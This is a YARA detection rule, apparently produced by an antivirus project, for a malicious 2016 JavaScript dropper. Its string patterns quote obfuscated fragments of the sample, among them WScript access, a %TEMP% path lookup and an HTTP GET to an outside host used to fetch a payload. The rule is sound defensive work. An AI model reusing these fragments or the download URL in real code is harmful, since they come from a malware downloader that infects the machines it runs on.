rule sig_20160428_c33f21bbff7cad7cfda39c400071c4fd {
  meta:
    description = "datamaliciousorder - file 20160428_c33f21bbff7cad7cfda39c400071c4fd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d079c2babc1eb5ca2a4a3086d21e950ada39ac4eeb2848d6508df58095d61f2c"

  strings:
    $s1  = "function JngLndEoeWprIjhDmrNhd(YlsHjmMqpJvfSlkAzpBxc){OehXfvRsiQucIreTetVyv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function JngLndEoeWprIjhDmrNhd(YlsHjmMqpJvfSlkAzpBxc){OehXfvRsiQucIreTetVyv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "var OehXfvRsiQucIreTetVyv = function UghAbhCnqCwpExhPvuHig() {return AwxJnnDexSrsZqcObsLqw[RgkInxSntPjqCliCozVlk](\"WScript\"+\"" ascii
    $s4  = "LcnUrxNglPpvMkmEtmFpu[OdlFqkRqbOmdXynHqpDir](\"G\" + \"ET\", \"http://sar-decor.ru/x8skfa\", false);" fullword ascii
    $s5  = "var OehXfvRsiQucIreTetVyv = function UghAbhCnqCwpExhPvuHig() {return AwxJnnDexSrsZqcObsLqw[RgkInxSntPjqCliCozVlk](\"WScript\"+\"" ascii
    $s6  = "var AwxJnnDexSrsZqcObsLqw = this[\"WScript\"];" fullword ascii
    $s7  = "function AlfAynDgcAezEbcErxGgj() {return OehXfvRsiQucIreTetVyv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s8  = "return XydMvaTnzRohJgjQybWzn - FcaXzxBnpSvgFvzEueOob;};" fullword ascii
    $s9  = "function YuwKuiWvzVrlMelForZqf(XydMvaTnzRohJgjQybWzn, FcaXzxBnpSvgFvzEueOob){LpzQpxWtvXjtLeqChvHcm = LpzQpxWtvXjtLeqChvHcm * 1; " ascii
    $s10 = "if (LcnUrxNglPpvMkmEtmFpu[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s11 = "function RjmCnpSnlRwcTekTjcGqk() {return ((IoyCrhKvbXvwNqzXqsLzs == true) && (IoyCrhKvbXvwNqzXqsLzs == BrlSbsWgeMwiDnnKehEpf)) ?" ascii
    $s12 = "function RjmCnpSnlRwcTekTjcGqk() {return ((IoyCrhKvbXvwNqzXqsLzs == true) && (IoyCrhKvbXvwNqzXqsLzs == BrlSbsWgeMwiDnnKehEpf)) ?" ascii
    $s13 = "function AlfAynDgcAezEbcErxGgj() {return OehXfvRsiQucIreTetVyv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s14 = "BrlSbsWgeMwiDnnKehEpf = true; " fullword ascii
    $s15 = "function NtwMgsKdqXgnNsiHknNzn(){return 23;};" fullword ascii
    $s16 = "var IoyCrhKvbXvwNqzXqsLzs = false;" fullword ascii
    $s17 = "function ZgaWzrQwvMndMjxCakIei(){return DtpSchDxzFdjAciJmvQns + \"\";};" fullword ascii
    $s18 = "return YuwKuiWvzVrlMelForZqf(1 == 1 ? OwnAzrAlvSzaRfbDrdNdl : 0, 1 == 1 ? KdtJegSsdJthAhuDfzWmk : 0);" fullword ascii
    $s19 = "function QneZunEyhSzhVxkEoxSmw()" fullword ascii
    $s20 = "var BrlSbsWgeMwiDnnKehEpf = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}